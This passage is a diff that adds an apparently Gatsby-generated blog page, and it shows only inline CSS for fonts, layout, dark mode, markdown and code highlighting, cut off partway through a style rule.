@@ -1,0 +1,920 @@
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.f0f69b0fea852e43ed02.css" data-identity="gatsby-global-css">@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:100;src:local("Montserrat Thin "),local("Montserrat-Thin"),url(/static/montserrat-latin-100-8d7d79679b70dbe27172b6460e7a7910.woff2) format("woff2"),url(/static/montserrat-latin-100-ec38980a9e0119a379e2a9b3dbb1901a.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:100;src:local("Montserrat Thin italic"),local("Montserrat-Thinitalic"),url(/static/montserrat-latin-100italic-e279051046ba1286706adc886cf1c96b.woff2) format("woff2"),url(/static/montserrat-latin-100italic-3b325a3173c8207435cd1b76e19bf501.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:200;src:local("Montserrat Extra Light "),local("Montserrat-Extra Light"),url(/static/montserrat-latin-200-9d266fbbfa6cab7009bd56003b1eeb67.woff2) format("woff2"),url(/static/montserrat-latin-200-2d8ba08717110d27122e54c34b8a5798.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:200;src:local("Montserrat Extra Light italic"),local("Montserrat-Extra Lightitalic"),url(/static/montserrat-latin-200italic-6e5b3756583bb2263eb062eae992735e.woff2) format("woff2"),url(/static/montserrat-latin-200italic-a0d6f343e4b536c582926255367a57da.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:300;src:local("Montserrat Light "),local("Montserrat-Light"),url(/static/montserrat-latin-300-00b3e893aab5a8fd632d6342eb72551a.woff2) format("woff2"),url(/static/montserrat-latin-300-ea303695ceab35f17e7d062f30e0173b.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:300;src:local("Montserrat Light italic"),local("Montserrat-Lightitalic"),url(/static/montserrat-latin-300italic-56f34ea368f6aedf89583d444bbcb227.woff2) format("woff2"),url(/static/montserrat-latin-300italic-54b0bf2c8c4c12ffafd803be2466a790.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:400;src:local("Montserrat Regular "),local("Montserrat-Regular"),url(/static/montserrat-latin-400-b71748ae4f80ec8c014def4c5fa8688b.woff2) format("woff2"),url(/static/montserrat-latin-400-0659a9f4e90db5cf51b50d005bff1e41.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:400;src:local("Montserrat Regular italic"),local("Montserrat-Regularitalic"),url(/static/montserrat-latin-400italic-6eed6b4cbb809c6efc7aa7ddad6dbe3e.woff2) format("woff2"),url(/static/montserrat-latin-400italic-7583622cfde30ae49086d18447ab28e7.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:500;src:local("Montserrat Medium "),local("Montserrat-Medium"),url(/static/montserrat-latin-500-091b209546e16313fd4f4fc36090c757.woff2) format("woff2"),url(/static/montserrat-latin-500-edd311588712a96bbf435fad264fff62.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:500;src:local("Montserrat Medium italic"),local("Montserrat-Mediumitalic"),url(/static/montserrat-latin-500italic-c90ced68b46050061d1a41842d6dfb43.woff2) format("woff2"),url(/static/montserrat-latin-500italic-5146cbfe02b1deea5dffea27a5f2f998.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:600;src:local("Montserrat SemiBold "),local("Montserrat-SemiBold"),url(/static/montserrat-latin-600-0480d2f8a71f38db8633b84d8722e0c2.woff2) format("woff2"),url(/static/montserrat-latin-600-b77863a375260a05dd13f86a1cee598f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:600;src:local("Montserrat SemiBold italic"),local("Montserrat-SemiBolditalic"),url(/static/montserrat-latin-600italic-cf46ffb11f3a60d7df0567f8851a1d00.woff2) format("woff2"),url(/static/montserrat-latin-600italic-c4fcfeeb057724724097167e57bd7801.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:700;src:local("Montserrat Bold "),local("Montserrat-Bold"),url(/static/montserrat-latin-700-7dbcc8a5ea2289d83f657c25b4be6193.woff2) format("woff2"),url(/static/montserrat-latin-700-99271a835e1cae8c76ef8bba99a8cc4e.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:700;src:local("Montserrat Bold italic"),local("Montserrat-Bolditalic"),url(/static/montserrat-latin-700italic-c41ad6bdb4bd504a843d546d0a47958d.woff2) format("woff2"),url(/static/montserrat-latin-700italic-6779372f04095051c62ed36bc1dcc142.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:800;src:local("Montserrat ExtraBold "),local("Montserrat-ExtraBold"),url(/static/montserrat-latin-800-db9a3e0ba7eaea32e5f55328ace6cf23.woff2) format("woff2"),url(/static/montserrat-latin-800-4e3c615967a2360f5db87d2f0fd2456f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:800;src:local("Montserrat ExtraBold italic"),local("Montserrat-ExtraBolditalic"),url(/static/montserrat-latin-800italic-bf45bfa14805969eda318973947bc42b.woff2) format("woff2"),url(/static/montserrat-latin-800italic-fe82abb0bcede51bf724254878e0c374.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:900;src:local("Montserrat Black "),local("Montserrat-Black"),url(/static/montserrat-latin-900-e66c7edc609e24bacbb705175669d814.woff2) format("woff2"),url(/static/montserrat-latin-900-8211f418baeb8ec880b80ba3c682f957.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:900;src:local("Montserrat Black italic"),local("Montserrat-Blackitalic"),url(/static/montserrat-latin-900italic-4454c775e48152c1a72510ceed3603e2.woff2) format("woff2"),url(/static/montserrat-latin-900italic-efcaa0f6a82ee0640b83a0916e6e8d68.woff) format("woff")}.search-input-wrapper{align-items:center;display:none;margin-top:3px;width:180px}@media(min-width:768px){.search-input-wrapper{display:flex}}.search-icon{color:var(--primary-text-color);margin-right:2px}.search-input{height:100%;width:100%}.search-input .MuiAutocomplete-inputRoot{padding-right:0!important}.search-input .MuiInputBase-input{color:var(--primary-text-color)!important;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;font-weight:500;padding-bottom:2px!important}.search-input .MuiInput-underline:before{border-bottom-width:1px}.search-input .MuiInput-underline:after,.search-input .MuiInput-underline:before{border-bottom-color:var(--primary-text-color)}.page-header-wrapper{display:flex;height:60px;justify-content:center;width:100%}.page-header-wrapper .page-header{align-items:center;display:flex;justify-content:space-between;max-width:720px;width:100%}.page-header-wrapper .page-header .link{color:var(--primary-text-color);font-size:17px;font-weight:700}@media(min-width:768px){.page-header-wrapper .page-header .link{font-size:20px;font-weight:700}}.page-header-wrapper .page-header .trailing-section{align-items:center;display:flex}.page-header-wrapper .page-header .trailing-section .link{margin-right:10px}@media(min-width:768px){.page-header-wrapper .page-header .trailing-section .link{margin-right:20px}}.page-footer-wrapper{align-items:center;display:flex;height:62px;justify-content:center;margin-top:auto;width:100%}.page-footer-wrapper .page-footer{max-width:720px;text-align:center;width:100%}.page-footer-wrapper .page-footer .link{color:var(--primary-text-color);font-size:20px;font-weight:700;margin-right:20px}.page-footer-wrapper .page-footer a{color:#3a95ff}.dark-mode-button-wrapper{align-items:center;bottom:20px;display:flex;justify-content:center;position:fixed;right:20px}.dark-mode-button{-webkit-backdrop-filter:blur(30px);backdrop-filter:blur(30px);background-color:#363f47!important;border-radius:50px;box-shadow:0 5px 25px rgba(0,0,0,.12);cursor:pointer;height:50px;width:50px;z-index:3}.dark-mode-icon{color:#fff}a,abbr,acronym,address,applet,article,aside,audio,b,big,blockquote,body,canvas,caption,center,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,html,i,iframe,img,ins,kbd,label,legend,li,mark,menu,nav,object,ol,output,p,pre,q,ruby,s,samp,section,small,span,strike,strong,sub,summary,sup,table,tbody,td,tfoot,th,thead,time,tr,tt,u,ul,var,video{border:0;font-size:100%;font:inherit;margin:0;padding:0;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:after,blockquote:before,q:after,q:before{content:"";content:none}table{border-collapse:collapse;border-spacing:0}a{outline:none;text-decoration:none}html{--background-color:#fff;--primary-text-color:#000;--secondary-text-color:#9e9e9e;--content-text-color:#37352f;--button-background-color:#f3f3f4;--button-text-color:#363f47;--tab-text-color:#6e6d7a;--tab-hover-text-color:#0d0c22;--tab-selected-background-color:rgba(13,12,34,.05);--bio-link-icon-color:rgba(0,0,0,.54);--about-link-icon-color:#a8a8a8;--chip-background-color:#f3f3f4;--link-text-color:rgba(55,53,47,.7);--post-card-border-color:rgba(0,0,0,.12);--markdown-table-even-cell-background-color:#f6f8fa;--markdown-table-border-color:#dfe2e5;--markdown-blockquote-border-color:#dfe2e5;--markdown-border-color:#e1e4e8}html[data-theme=dark]{--background-color:#232326;--primary-text-color:#e6e6e6;--secondary-text-color:#768390;--content-text-color:#e6e6e6;--button-background-color:#444c56;--button-text-color:#363f47;--tab-text-color:#768390;--tab-hover-text-color:#acbac7;--tab-selected-background-color:#373e47;--chip-background-color:#323a42;--bio-link-icon-color:#e6e6e6;--about-link-icon-color:#a8a8a8;--link-text-color:#90b0ec;--post-card-border-color:#363f47;--markdown-table-even-cell-background-color:#2d333b;--markdown-table-border-color:#444c56;--markdown-blockquote-border-color:#4f5864;--markdown-border-color:#e1e4e8}*{-webkit-appearance:none;appearance:none;box-sizing:border-box}html{font-size:14px;height:100%;overflow-y:scroll;width:100%}body{background-color:var(--background-color)!important}a{color:var(--link-text-color)}.page-wrapper{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;color:var(--primary-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;justify-content:center;min-height:100vh;padding-left:15px;padding-right:15px;word-break:keep-all}.page-wrapper,.page-wrapper .page-content{align-items:center;display:flex;flex-direction:column;width:100%}.page-wrapper .page-content{max-width:720px}.icon{color:var(--about-link-icon-color);font-size:20px}.social-links .icon{color:var(--bio-link-icon-color);font-size:30px}@-webkit-keyframes blinking-cursor{0%{opacity:0}50%{opacity:1}to{opacity:0}}@keyframes blinking-cursor{0%{opacity:0}50%{opacity:1}to{opacity:0}}.bio{color:var(--primary-text-color);display:flex;flex-direction:column;justify-content:space-between;margin-bottom:120px;margin-top:120px;width:100%}@media(min-width:768px){.bio{align-items:center;flex-direction:row}}.bio .introduction{display:flex;flex-direction:column;word-break:keep-all}.bio .introduction .react-rotating-text-cursor{-webkit-animation:blinking-cursor .8s cubic-bezier(.68,.01,.01,.99) 0s infinite;animation:blinking-cursor .8s cubic-bezier(.68,.01,.01,.99) 0s infinite}.bio .introduction strong{display:inline-block;font-weight:600}.bio .introduction.korean{font-size:32px;font-weight:100;line-height:1.2}.bio .introduction.korean .title .react-rotating-text-cursor{font-size:35px;line-height:35px}@media(min-width:768px){.bio .introduction.korean{font-size:40px}.bio .introduction.korean .title .react-rotating-text-cursor{font-size:45px;line-height:45px}}.bio .introduction.english{font-family:montserrat;font-size:25px;line-height:1.2}@media(min-width:768px){.bio .introduction.english{font-size:45px}}.bio .introduction.english .name{font-size:35px;font-weight:600}.bio .introduction.english .job{font-size:35px}.bio .introduction.english .description{font-size:20px;font-weight:200;margin-top:8px}.bio .introduction.english .social-links{display:flex;margin-top:20px}.bio .thumbnail{display:none;width:250px}@media(min-width:768px){.bio .thumbnail{display:block}}.section-header-wrapper{display:flex;justify-content:center;margin-bottom:32px;width:100%}.section-header-wrapper .section-header{border-bottom:4px solid var(--primary-text-color);color:var(--primary-text-color);font-size:30px;font-weight:700;padding-bottom:5px}.timestamp-section{align-items:center;display:flex;flex-direction:column;justify-content:center;margin-bottom:50px;width:100%;word-break:keep-all}.timestamp-section .body{padding:0 10px;width:100%}.timestamp-section .body .timestamp{border-left:2px solid #bdbdbd;display:flex;font-size:18px;font-weight:400;justify-items:center;margin-left:5px;padding:10px 0;width:100%}.timestamp-section .body .timestamp:first-child{padding-top:7px}.timestamp-section .body .timestamp:last-child{padding-bottom:7px}.timestamp-section .body .timestamp:before{align-self:center;background-color:var(--background-color);border:2px solid #828282;border-radius:10px;content:"";height:10px;left:-1px;position:relative;-webkit-transform:translatex(-50%);transform:translatex(-50%);width:10px}.timestamp-section .body .timestamp .date{align-self:center;color:#828282;margin-left:5px;margin-right:5px;min-width:115px;width:115px}@media(min-width:768px){.timestamp-section .body .timestamp .date{min-width:200px;width:200px}}.timestamp-section .body .timestamp .activity{line-height:23px;width:100%}.project-section{align-items:center;justify-content:center}.project-section,.project-section .project{display:flex;flex-direction:column;width:100%}.project-section .project{margin-bottom:30px;padding:15px}.project-section .project .head{font-size:20px;font-weight:700;line-height:30px;margin-bottom:10px}.project-section .project .body{display:flex;flex-direction:column;width:100%}.project-section .project .body .thumbnail{margin-bottom:10px;width:100%}.project-section .project .body .tech-stack{display:flex;margin-bottom:10px}.project-section .project .body .tech-stack .tech{background-color:var(--chip-background-color);border-radius:10px;font-size:15px;font-weight:500;margin-right:5px;padding:5px 7px}.project-section .project .body .description{font-size:16px;font-weight:400;line-height:1.4}@media(min-width:768px){.project-section .project .body{flex-direction:column}.project-section .project .body .content{margin-top:0}}.post-header{border-bottom:1px solid var(--post-card-border-color);display:flex;flex-direction:column;justify-content:center;margin-bottom:40px;margin-top:20px;padding-bottom:10px;width:100%;word-break:keep-all}.post-header .emoji{font-size:78px;margin-bottom:20px}.post-header .categories{margin-bottom:5px}.post-header .categories .category{color:var(--primary-text-color);font-weight:600;margin-right:4px}.post-header .categories .category:hover{text-decoration:underline}.post-header .title{color:var(--primary-text-color);font-size:32px;font-weight:600;line-height:1.3;margin-bottom:6px}.post-header .info{color:var(--secondary-text-color);display:flex;flex-wrap:wrap;font-size:16px;font-weight:500;line-height:1.5;width:100%}.post-header .info .author{margin-right:4px}.post-header .info strong{color:var(--primary-text-color);font-weight:600}.post-navigator{-webkit-column-gap:1.4%;column-gap:1.4%;display:grid;grid-template-columns:49.3% 49.3%;width:100%}.post-navigator .post-card{border:1px solid var(--post-card-border-color);border-radius:6px;color:var(--primary-text-color);cursor:pointer;display:flex;flex-direction:column;padding:15px;transition:-webkit-transform .2s;transition:transform .2s;transition:transform .2s,-webkit-transform .2s;width:100%}.post-navigator .post-card:hover .title{text-decoration:underline}.post-navigator .post-card.prev{margin-right:auto}.post-navigator .post-card.next{margin-left:auto}.post-navigator .post-card .direction{color:gray;font-size:14px;font-weight:500;margin-bottom:5px}.post-navigator .post-card .title{font-size:16px;font-weight:600;line-height:1.4;margin-bottom:7px}.markdown .octicon{fill:currentColor;display:inline-block;vertical-align:text-bottom}.markdown .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown .anchor:focus{outline:none}.markdown h1 .octicon-link,.markdown h2 .octicon-link,.markdown h3 .octicon-link,.markdown h4 .octicon-link,.markdown h5 .octicon-link,.markdown h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown h1:hover .anchor,.markdown h2:hover .anchor,.markdown h3:hover .anchor,.markdown h4:hover .anchor,.markdown h5:hover .anchor,.markdown h6:hover .anchor{text-decoration:none}.markdown h1:hover .anchor .octicon-link,.markdown h2:hover .anchor .octicon-link,.markdown h3:hover .anchor .octicon-link,.markdown h4:hover .anchor .octicon-link,.markdown h5:hover .anchor .octicon-link,.markdown h6:hover .anchor .octicon-link{visibility:visible}.markdown h1:hover .anchor .octicon-link:before,.markdown h2:hover .anchor .octicon-link:before,.markdown h3:hover .anchor .octicon-link:before,.markdown h4:hover .anchor .octicon-link:before,.markdown h5:hover .anchor .octicon-link:before,.markdown h6:hover .anchor .octicon-link:before{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true' viewBox='0 0 16 16'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E");content:" ";display:inline-block;height:16px;width:16px}.markdown{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;word-wrap:break-word;color:var(--content-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;font-weight:500;line-height:1.5}.markdown details{display:block}.markdown summary{display:list-item}.markdown a{background-color:initial}.markdown a:active,.markdown a:hover{outline-width:0}.markdown strong{font-weight:inherit;font-weight:bolder}.markdown h1{margin:.67em 0}.markdown img{border-style:none}.markdown code,.markdown kbd,.markdown pre{font-family:monospace,monospace;font-size:1em}.markdown hr{box-sizing:initial;overflow:visible}.markdown input{font:inherit;margin:0;overflow:visible}.markdown [type=checkbox]{box-sizing:border-box;padding:0}.markdown *{box-sizing:border-box}.markdown input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown a{border-bottom:.05em solid;border-color:var(--link-text-color);color:var(--link-text-color);text-decoration:none}.markdown a.anchor{border-bottom:none}.markdown strong{font-weight:700}.markdown hr{background:transparent;border-bottom:1px solid var(--markdown-blockquote-border-color);height:0;margin:15px 0;overflow:hidden}.markdown hr:after,.markdown hr:before{content:"";display:table}.markdown hr:after{clear:both}.markdown table{border-collapse:collapse;border-spacing:0}.markdown td,.markdown th{padding:0}.markdown details summary{cursor:pointer}.markdown h1,.markdown h2,.markdown h3,.markdown h4,.markdown h5,.markdown h6{margin-bottom:0;margin-top:0}.markdown h1{font-size:32px}.markdown h1,.markdown h2{font-weight:600}.markdown h2{font-size:24px}.markdown h3{font-size:20px}.markdown h3,.markdown h4{font-weight:600}.markdown h4{font-size:16px}.markdown h5{font-size:14px}.markdown h5,.markdown h6{font-weight:600}.markdown h6{font-size:12px}.markdown p{margin-bottom:10px;margin-top:0}.markdown blockquote{margin:0}.markdown ol,.markdown ul{margin-bottom:0;margin-top:0;padding-left:0}.markdown ol ol,.markdown ul ol{list-style-type:lower-roman}.markdown ol ol ol,.markdown ol ul ol,.markdown ul ol ol,.markdown ul ul ol{list-style-type:lower-alpha}.markdown dd{margin-left:0}.markdown code,.markdown pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown code.language-text{border-radius:3px;font-size:85%;padding:.2em .4em}.markdown :not(pre)>code.language-text{background:hsla(44,6%,50%,.15);color:#eb5757;overflow-wrap:break-word}.markdown pre{margin-bottom:0;margin-top:0}.markdown input::-webkit-inner-spin-button,.markdown input::-webkit-outer-spin-button{-webkit-appearance:none;appearance:none;margin:0}.markdown :checked+.radio-label{border-color:#0366d6;position:relative;z-index:1}.markdown .border{border:1px solid var(--markdown-border-color)!important}.markdown .border-0{border:0!important}.markdown .border-bottom{border-bottom:1px solid var(--markdown-border-color)!important}.markdown .rounded-1{border-radius:3px!important}.markdown .bg-white{background-color:transparent!important}.markdown .bg-gray-light{background-color:#fafbfc!important}.markdown .text-gray-light{color:#6a737d!important}.markdown .pl-3,.markdown .px-3{padding-left:16px!important}.markdown .px-3{padding-right:16px!important}.markdown .f6{font-size:12px!important}.markdown .lh-condensed{line-height:1.25!important}.markdown .text-bold{font-weight:600!important}.markdown .pl-c{color:#6a737d}.markdown .pl-c1,.markdown .pl-s .pl-v{color:#005cc5}.markdown .pl-e,.markdown .pl-en{color:#6f42c1}.markdown .pl-s .pl-s1,.markdown .pl-smi{color:#24292e}.markdown .pl-ent{color:#22863a}.markdown .pl-k{color:#d73a49}.markdown .pl-pds,.markdown .pl-s,.markdown .pl-s .pl-pse .pl-s1,.markdown .pl-sr,.markdown .pl-sr .pl-cce,.markdown .pl-sr .pl-sra,.markdown .pl-sr .pl-sre{color:#032f62}.markdown .pl-smw,.markdown .pl-v{color:#e36209}.markdown .pl-bu{color:#b31d28}.markdown .pl-ii{background-color:#b31d28;color:#fafbfc}.markdown .pl-c2{background-color:#d73a49;color:#fafbfc}.markdown .pl-c2:before{content:"^M"}.markdown .pl-sr .pl-cce{color:#22863a;font-weight:700}.markdown .pl-ml{color:#735c0f}.markdown .pl-mh,.markdown .pl-mh .pl-en,.markdown .pl-ms{color:#005cc5;font-weight:700}.markdown .pl-mi{color:#24292e;font-style:italic}.markdown .pl-mb{color:#24292e;font-weight:700}.markdown .pl-md{background-color:#ffeef0;color:#b31d28}.markdown .pl-mi1{background-color:#f0fff4;color:#22863a}.markdown .pl-mc{background-color:#ffebda;color:#e36209}.markdown .pl-mi2{background-color:#005cc5;color:#f6f8fa}.markdown .pl-mdr{color:#6f42c1;font-weight:700}.markdown .pl-ba{color:#586069}.markdown .pl-sg{color:#959da5}.markdown .pl-corl{color:#032f62;text-decoration:underline}.markdown .mb-0{margin-bottom:0!important}.markdown .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown .pl-0{padding-left:0!important}.markdown .py-0{padding-bottom:0!important;padding-top:0!important}.markdown .pl-1{padding-left:4px!important}.markdown .pl-2{padding-left:8px!important}.markdown .py-2{padding-bottom:8px!important;padding-top:8px!important}.markdown .pl-3{padding-left:16px!important}.markdown .pl-4{padding-left:24px!important}.markdown .pl-5{padding-left:32px!important}.markdown .pl-6{padding-left:40px!important}.markdown .pl-7{padding-left:48px!important}.markdown .pl-8{padding-left:64px!important}.markdown .pl-9{padding-left:80px!important}.markdown .pl-10{padding-left:96px!important}.markdown .pl-11{padding-left:112px!important}.markdown .pl-12{padding-left:128px!important}.markdown hr{border-bottom-color:#eee}.markdown kbd{background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da;color:#444d56;display:inline-block;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;padding:3px 5px;vertical-align:middle}.markdown:after,.markdown:before{content:"";display:table}.markdown:after{clear:both}.markdown>:first-child{margin-top:0!important}.markdown>:last-child{margin-bottom:0!important}.markdown a:not([href]){color:inherit;text-decoration:none}.markdown blockquote,.markdown details,.markdown dl,.markdown ol,.markdown p,.markdown pre,.markdown table,.markdown ul{margin-bottom:16px;margin-top:0}.markdown hr{background-color:var(--markdown-border-color);border:0;height:.25em;margin:24px 0;padding:0}.markdown blockquote{border-left:.25em solid var(--markdown-blockquote-border-color);color:#6a737d;padding:0 1em}.markdown blockquote>:first-child{margin-top:0}.markdown blockquote>:last-child{margin-bottom:0}.markdown h1,.markdown h2,.markdown h3,.markdown h4,.markdown h5,.markdown h6{font-weight:600;line-height:1.25;margin-bottom:16px;margin-top:24px}.markdown h1{font-size:2em}.markdown h2{font-size:1.5em}.markdown h3{font-size:1.25em}.markdown h4{font-size:1em}.markdown h5{font-size:.875em}.markdown h6{color:#6a737d;font-size:.85em}.markdown ol,.markdown ul{padding-left:2em}.markdown ol ol,.markdown ol ul,.markdown ul ol,.markdown ul ul{margin-bottom:0;margin-top:0}.markdown ol{list-style-type:decimal}.markdown ul{list-style-type:disc}.markdown li{word-wrap:break-all;display:list-item;text-align:-webkit-match-parent}.markdown li>p{margin-top:16px}.markdown li+li{margin-top:.25em}.markdown dl{padding:0}.markdown dl dt{font-size:1em;font-style:italic;font-weight:600;margin-top:16px;padding:0}.markdown dl dd{margin-bottom:16px;padding:0 16px}.markdown table{display:block;overflow:auto;width:100%}.markdown table th{font-weight:600}.markdown table td,.markdown table th{border:1px solid var(--markdown-table-border-color);padding:6px 13px}.markdown table tr{border-top:1px solid var(--markdown-table-border-color)}.markdown table tr:nth-child(2n){background-color:var(--markdown-table-even-cell-background-color)}.markdown img{background-color:transparent;box-sizing:initial;display:block;margin:0 auto;max-width:100%}.markdown img[align=right]{padding-left:20px}.markdown img[align=left]{padding-right:20px}.markdown code{background-color:rgba(27,31,35,.05);border-radius:3px;font-size:85%;margin:0;padding:.2em .4em}.markdown pre{word-wrap:normal}.markdown pre>code{background:transparent;border:0;font-size:100%;margin:0;padding:0;white-space:pre;word-break:normal}.markdown .highlight{margin-bottom:16px}.markdown .highlight pre{margin-bottom:0;word-break:normal}.markdown .highlight pre,.markdown pre{background-color:#f6f8fa;border-radius:3px;font-size:85%;line-height:1.45;overflow:auto;padding:16px}.markdown pre code{word-wrap:normal;background-color:initial;border:0;display:inline;line-height:inherit;margin:0;max-width:auto;overflow:visible;padding:0}.markdown .commit-tease-sha{color:#444d56;display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%}.markdown .full-commit .btn-outline:not(:disabled):hover{border-color:#005cc5;color:#005cc5}.markdown .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown .blob-num{color:rgba(27,31,35,.3);cursor:pointer;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;min-width:50px;padding-left:10px;padding-right:10px;text-align:right;-webkit-user-select:none;user-select:none;vertical-align:top;white-space:nowrap;width:1%}.markdown .blob-num:hover{color:rgba(27,31,35,.6)}.markdown .blob-num:before{content:attr(data-line-number)}.markdown .blob-code{line-height:20px;padding-left:10px;padding-right:10px;position:relative;vertical-align:top}.markdown .blob-code-inner{word-wrap:normal;color:#24292e;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;overflow:visible;white-space:pre}.markdown .pl-token.active,.markdown .pl-token:hover{background:#ffea7f;cursor:pointer}.markdown .tab-size[data-tab-size="1"]{-o-tab-size:1;tab-size:1}.markdown .tab-size[data-tab-size="2"]{-o-tab-size:2;tab-size:2}.markdown .tab-size[data-tab-size="3"]{-o-tab-size:3;tab-size:3}.markdown .tab-size[data-tab-size="4"]{-o-tab-size:4;tab-size:4}.markdown .tab-size[data-tab-size="5"]{-o-tab-size:5;tab-size:5}.markdown .tab-size[data-tab-size="6"]{-o-tab-size:6;tab-size:6}.markdown .tab-size[data-tab-size="7"]{-o-tab-size:7;tab-size:7}.markdown .tab-size[data-tab-size="8"]{-o-tab-size:8;tab-size:8}.markdown .tab-size[data-tab-size="9"]{-o-tab-size:9;tab-size:9}.markdown .tab-size[data-tab-size="10"]{-o-tab-size:10;tab-size:10}.markdown .tab-size[data-tab-size="11"]{-o-tab-size:11;tab-size:11}.markdown .tab-size[data-tab-size="12"]{-o-tab-size:12;tab-size:12}.markdown .task-list-item{list-style-type:none}.markdown .task-list-item+.task-list-item{margin-top:3px}.markdown .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}.markdown .table-of-contents{align-items:flex-start;display:flex;flex-direction:column;justify-content:center;position:fixed;right:0;top:75px;width:340px}@media(max-width:1300px){.markdown .table-of-contents{display:none}}.markdown .table-of-contents ul{cursor:pointer;list-style-type:none}.markdown .table-of-contents ul li a{border-bottom:none;color:var(--secondary-text-color);font-size:14px;height:30px;padding:6px 2px;width:100%}.markdown .table-of-contents ul p{margin:0}.markdown .gatsby-resp-image-wrapper{display:flex!important;justify-content:center!important;max-height:560px!important;width:100%!important}.markdown .gatsby-resp-image-wrapper img{height:auto!important;max-height:560px!important;max-width:100%!important;position:relative!important;width:auto!important}.markdown .gatsby-resp-image-wrapper+em{color:#6a737d;display:block;font-size:15px;font-style:italic;text-align:center}code[class*=language-],pre[class*=language-]{word-wrap:normal;background:none;color:#ccc;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;hyphens:none;line-height:1.5;-o-tab-size:4;tab-size:4;text-align:left;white-space:pre;word-break:normal;word-spacing:normal}pre[class*=language-]{margin:.5em 0;overflow:auto;padding:1em}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{border-radius:.3em;padding:.1em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}.post-content{margin-bottom:20px;width:100%}.category-page-header-wrapper,.post-content{display:flex;flex-direction:column;justify-content:center}.category-page-header-wrapper{align-items:center;margin-bottom:30px;margin-top:30px}.category-page-header-wrapper .category-page-title{border-bottom:3px solid 